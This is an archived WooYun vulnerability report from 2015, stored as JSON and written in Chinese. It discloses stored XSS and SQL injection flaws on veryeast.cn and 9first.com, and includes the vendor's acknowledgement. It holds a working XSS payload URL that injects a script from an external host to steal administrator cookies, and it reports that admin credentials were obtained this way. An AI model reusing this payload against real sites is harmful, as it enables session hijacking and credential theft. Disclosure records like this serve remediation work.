{"id": 29031, "wybug_id": "wooyun-2015-0120642", "wybug_title": "东方网升多个分站漏洞大礼包#存储xss&amp;sql注射", "wybug_corp": "最佳东方", "wybug_author": "range", "wybug_date": "2015-06-15 17:56", "wybug_open_date": "2015-07-31 14:24", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向公众公开  简要描述： 最佳东方与先之培训同属东方网升公司旗下子业务 详细说明：  1.最佳东方XSShttp://vip.veryeast.cn/system/micro在最佳东方注册企业后，可以发布自己的微站，展示给所有人。在下面设置标题中只是本地验证了长度，burp抓包后即可以更改，后台未过滤。弹弹弹：\nhttp://m.veryeast.cn/micro/site/index?c_userid=2277338\n\n\n2.先之XSS打管理员cookie，查看各种敏感信息\nhttp://lms2.9first.com/register/company?name=%E8%80%81%E5%88%98&contacts=%3Cimg%20src=x%20onerror=s=createElement%28%27script%27%29;body.appendChild%28s%29;s.src=%27http://xiix.ml/sOg9ag%27;%3E&contacts_mobile=13015648625\n很多地方都可以插，然后就有了cookie\n\n最开始是：\n\n加了cookie：\n\n不知为何，使用cookie无法登录管理首页(应该是需要授权码)然后遍历一下\n\n各种密码，各种管理员\n\n3.sql注射后台这里就存在sql注射，估计是觉得后台很安全吧\n\n4.先之后台xss(影响较小)在资料中 http://home.9first.com/myAccount 填写公司的地方完全没有过滤导致存储型XSS \n\n\nhttp://home.9first.com/myAccount\n填写姓名的地方，没有完全过滤，应该是数据库中存的源码，显示的时候才过滤，所以细节没有注意 \n\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n各种密码，各种管理员\n\n\n\n\n\n\n\n   修复方案：  过滤过滤过滤,没有过滤的地方太多了，估计不止这几个，另外，不要存明文没有继续深入，打包了这么多，求礼物！^_^   版权声明：转载请注明来源 range@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-06-16 14:22 厂商回复： 多谢您的指正。我们会对这类问题做出整改。再次感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-16 16:05 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  @最佳东方 求礼物啊，给点继续挖洞的动力呗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}